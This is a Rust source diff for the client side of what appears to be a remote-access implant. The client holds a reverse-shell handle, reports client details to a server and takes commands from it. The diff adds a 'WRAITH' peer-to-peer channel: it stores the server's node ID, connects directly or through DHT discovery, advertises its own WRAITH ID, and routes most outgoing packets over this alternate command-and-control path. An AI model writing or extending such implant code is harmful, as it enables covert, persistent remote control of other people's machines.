@@ -38,6 +38,8 @@ use common::connection::{ConnectionReader, ConnectionWriter};
 use crate::service::config::get_config;
 use crate::REVERSE_SHELL;
 
+pub static WRAITH_NODE: Lazy<Mutex<Option<wraith_core::Node>>> = Lazy::new(|| Mutex::new(None));
+static WRAITH_SERVER_ID: Lazy<Mutex<Option<[u8; 32]>>> = Lazy::new(|| Mutex::new(None));
 static PACKET_SENDER: Lazy<Mutex<Option<mpsc::Sender<ServerboundPacket>>>> = Lazy::new(|| {
     Mutex::new(None)
 });
@@ -54,8 +56,36 @@ pub async fn reading_loop(
     let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
+            Ok(Some(ClientboundPacket::WraithServerInfo { node_id, ip, port })) => {
+                let mut server_id = WRAITH_SERVER_ID.lock().unwrap();
+                *server_id = Some(node_id);
+                println!("Received WRAITH server info: {}:{} id: {:?}", ip, port, node_id);
+
+                let node_opt = WRAITH_NODE.lock().unwrap().clone();
+                if let Some(node) = node_opt {
+                    let addr_str = format!("{}:{}", ip, port);
+                    if let Ok(addr) = addr_str.parse() {
+                        tokio::spawn(async move {
+                            if let Err(e) = node.establish_session_with_addr(&node_id, addr).await {
+                                println!("Failed to establish WRAITH session with direct addr: {}. Trying DHT discovery...", e);
+                                if let Err(e) = node.establish_session(&node_id).await {
+                                    println!("Failed WRAITH session via DHT: {}", e);
+                                } else {
+                                    println!("Established WRAITH session via DHT");
+                                }
+                            } else {
+                                println!("Established WRAITH session with server directly");
+                            }
+                        });
+                    }
+                }
+            }
+
             Ok(Some(ClientboundPacket::InitClient)) => {
-                let client_info = client_info(config.group.clone()).await;
+                let mut client_info = client_info(config.group.clone()).await;
+                if let Some(node) = WRAITH_NODE.lock().unwrap().as_ref() {
+                    client_info.data.wraith_id = Some(*node.node_id());
+                }
                 
                 match send_packet(ServerboundPacket::ClientInfo(client_info.clone())).await {
                     Ok(_) => println!("Sent client info to server"),
@@ -356,6 +386,18 @@ pub async fn send_packet(packet: ServerboundPacket) -> Result<(), String> {
         };
         
         if let Some(sender) = sender_opt {
+            let wraith_node = WRAITH_NODE.lock().unwrap().clone();
+            let server_id = WRAITH_SERVER_ID.lock().unwrap().clone();
+
+            if let (Some(node), Some(sid)) = (wraith_node, server_id) {
+                // If it is not the very first packets, try WRAITH
+                let is_critical = matches!(packet, ServerboundPacket::EncryptionRequest | ServerboundPacket::EncryptionConfirm(_, _) | ServerboundPacket::ClientInfo(_));
+                if !is_critical {
+                    if let Ok(()) = node.send_data(&sid, &packet.serialized()).await {
+                        return Ok(());
+                    }
+                }
+            }
             return sender.send(packet).await.map_err(|e| e.to_string());
         }
         
